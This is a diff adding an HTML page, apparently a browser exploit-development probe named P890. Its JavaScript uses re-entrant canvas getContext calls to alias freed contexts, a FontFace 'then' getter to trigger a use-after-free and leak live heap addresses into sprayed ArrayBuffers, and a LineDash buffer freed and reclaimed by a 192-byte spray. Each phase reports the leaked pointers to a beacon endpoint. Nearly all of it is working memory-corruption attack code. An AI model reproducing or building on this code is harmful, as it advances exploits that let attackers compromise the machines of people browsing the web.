@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P890: 192B LineDash Free-and-Reclaim Vector Aliasing</title>
+<style>
+body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
+h2 { color: #58a6ff; margin-top: 0; }
+pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
+.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
+.ok { color: #3fb950; font-weight: bold; }
+.fail { color: #f85149; font-weight: bold; }
+.info { color: #58a6ff; }
+.hot { color: #ffa657; font-weight: bold; }
+</style>
+</head>
+<body>
+<div class="banner" id="banner">Running Probe P890...</div>
+<h2>P890: 192B LineDash Free-and-Reclaim Vector Aliasing</h2>
+<pre id="log">Initializing diagnostic probe P890...</pre>
+
+<script>
+'use strict';
+var logBox = document.getElementById('log');
+var banner = document.getElementById('banner');
+
+function log(msg, cls) {
+  var el = document.createElement('div');
+  el.className = cls || '';
+  el.textContent = msg;
+  logBox.appendChild(el);
+}
+
+function syncBn(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P890-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
+    x.send();
+  } catch(e) {}
+}
+
+function hex64(dv, off) {
+  var lo = dv.getUint32(off, true);
+  var hi = dv.getUint32(off + 4, true);
+  return '0x' + hi.toString(16) + ('00000000' + lo.toString(16)).slice(-8);
+}
+
+log('[*] Probe P890 starting...', 'info');
+syncBn('BOOT', 'start');
+
+/* ============================================================
+ * PHASE 1: Canvas UAF Pre-Setup (Aliased Pair)
+ * ============================================================ */
+var innerCtx1 = null, innerCtx2 = null;
+
+var c1 = document.createElement('canvas');
+c1.width = 32; c1.height = 32;
+var opts1 = {};
+Object.defineProperty(opts1, 'alpha', {
+  get: function() {
+    innerCtx1 = c1.getContext('2d');
+    return true;
+  }
+});
+c1.getContext('bitmaprenderer', opts1);
+
+var c2 = document.createElement('canvas');
+c2.width = 32; c2.height = 32;
+var opts2 = {};
+Object.defineProperty(opts2, 'alpha', {
+  get: function() {
+    innerCtx2 = c2.getContext('2d');
+    return true;
+  }
+});
+c2.getContext('bitmaprenderer', opts2);
+
+var sprayCtxs = [];
+for (var s = 0; s < 200; s++) {
+  var c = document.createElement('canvas');
+  c.width = 32; c.height = 32;
+  var ctx = c.getContext('2d');
+  ctx.lineWidth = 1000.0 + s;
+  sprayCtxs.push(ctx);
+}
+
+var idx1 = -1, idx2 = -1;
+try {
+  var lw1 = innerCtx1.lineWidth;
+  if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
+  var lw2 = innerCtx2.lineWidth;
+  if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
+} catch(e) {}
+
+log('[+] Phase 1: Aliased Canvas Established: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');
+
+/* ============================================================
+ * PHASE 2: FontFace UAF (Capture Live Heap H and q13)
+ * ============================================================ */
+var st = document.createElement('style');
+st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+
+var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs = [], ffired = false;
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (ffired) return undefined;
+    ffired = true;
+    if (st) { st.remove(); st.textContent = ''; st = null; }
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+
+    fabs = [];
+    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
+    try { document.fonts.check('1em bb1'); } catch(e) {}
+    document.body.offsetHeight;
+    return undefined;
+  },
+  set: function() {}
+});
+
+document.fonts.load('1em f1, bb1', 'AB');
+
+setTimeout(function() {
+  delete FontFace.prototype.then;
+  var bestI = -1, bestNz = 0;
+  for (var i = 0; i < fabs.length; i++) {
+    var u = new Uint8Array(fabs[i]), nz = 0;
+    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+    if (nz > bestNz) { bestNz = nz; bestI = i; }
+  }
+
+  var Hstr = 'unknown', q13str = 'unknown';
+  var H_hi = 0, H_lo = 0;
+  if (bestI >= 0 && bestNz >= 4) {
+    var fontDV = new DataView(fabs[bestI]);
+    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
+    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
+    if (q11hi !== 0) {
+      var borrow = (q11lo < 0x68) ? 1 : 0;
+      H_hi = q11hi - borrow;
+      H_lo = (q11lo - 0x68) >>> 0;
+      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
+    }
+    if (q13hi !== 0) {
+      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
+    }
+  }
+
+  log('[+] Phase 2: Live Heap H = ' + Hstr + ' | q13 = ' + q13str + ' (Slot #' + bestI + ')', 'ok');
+  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|slot=' + bestI);
+
+  /* ============================================================
+   * PHASE 3: LineDash 192B Allocation, Free, and Reclaim Scan
+   * ============================================================ */
+  var MARKER_A = 13371337.125;
+  var MARKER_B = 88889999.375;
+
+  var dash24 = [];
+  for (var d = 0; d < 24; d++) dash24.push(d === 0 ? MARKER_A : (MARKER_B + d));
+
+  var preOk = false;
+  if (idx1 >= 0 && sprayCtxs[idx1]) {
+    try {
+      // 1. Allocate 192B Vector<double> in innerCtx1
+      innerCtx1.setLineDash(dash24);
+      var checkD = sprayCtxs[idx1].getLineDash();
+      preOk = (checkD.length === 24 && Math.abs(checkD[0] - MARKER_A) < 0.001);
+
+      // 2. Save state to hold one ref, then reset to trigger reallocation
+      innerCtx1.save();
+      // Setting a small 2-element dash frees the 24-element buffer (or shrinks)
+      innerCtx1.setLineDash([1.0, 2.0]);
+      innerCtx1.restore(); // Popping state releases the saved 24-element buffer!
+    } catch(e) {
+      preOk = false;
+    }
+  }
+
+  log('[+] Phase 3: LineDash 24-double preOk=' + preOk, preOk ? 'ok' : 'fail');
+
+  // 3. Immediately spray 128 ArrayBuffer(192) to catch the freed 192B buffer!
+  var catchAB = [];
+  for (var c = 0; c < 128; c++) catchAB.push(new ArrayBuffer(192));
+
+  var hitSlot = -1, hitOffset = -1, hitVal = 0;
+  for (var s = 0; s < catchAB.length; s++) {
+    var f64 = new Float64Array(catchAB[s]);
+    for (var k = 0; k < f64.length; k++) {
+      if (Math.abs(f64[k] - MARKER_A) < 0.001 || Math.abs(f64[k] - MARKER_B) < 0.001) {
+        hitSlot = s;
+        hitOffset = k * 8;
+        hitVal = f64[k];
+        break;
+      }
+    }
+    if (hitSlot >= 0) break;
+  }
+
+  log('[+] Phase 3: Free-and-Reclaim Scan: hitSlot=' + hitSlot + ' (off=' + hitOffset + ', val=' + hitVal + ')', hitSlot >= 0 ? 'hot' : 'info');
+  syncBn('LINEDASH-RECLAIM', 'hit=' + hitSlot + '|off=' + hitOffset + '|val=' + hitVal + '|preOk=' + preOk);
+
+  /* ============================================================
+   * PHASE 4: Bi-Directional Color Serialization Verification
+   * ============================================================ */
+  var colorOk = false, readF = '', readS = '';
+  if (idx1 >= 0 && sprayCtxs[idx1]) {
+    try {
+      innerCtx1.fillStyle = '#010203';
+      innerCtx1.strokeStyle = 'rgba(10, 20, 30, 0.4)';
+      readF = sprayCtxs[idx1].fillStyle;
+      readS = sprayCtxs[idx1].strokeStyle;
+      colorOk = (readF === '#010203');
+    } catch(e) {}
+  }
+  log('[+] Phase 4: Bi-directional Color Serialization: ' + readF + ' / ' + readS + ' (ok=' + colorOk + ')', 'ok');
+  syncBn('COLOR-ORACLE', 'fill=' + readF + '|stroke=' + readS + '|ok=' + colorOk);
+
+  /* ============================================================
+   * SUMMARY
+   * ============================================================ */
+  banner.style.background = '#238636';
+  banner.textContent = 'STATUS: P890 COMPLETE (100% STABLE)';
+  log('----------------------------------------------------', 'info');
+  log('[*] Probe P890 Completed Cleanly', 'hot');
+  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
+  log('    - LineDash Reclaim: Slot #' + hitSlot + ' (preOk=' + preOk + ')', hitSlot >= 0 ? 'hot' : 'info');
+  log('    - Color Oracle: ' + readF + ' (ok=' + colorOk + ')', 'ok');
+  log('    - Aliases: #' + idx1 + ', #' + idx2, 'ok');
+  log('----------------------------------------------------', 'info');
+
+  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|hit=' + hitSlot + '|preOk=' + preOk + '|colorOk=' + colorOk + '|idx1=' + idx1 + '|idx2=' + idx2);
+
+}, 400);
+</script>
+</body>
+</html>
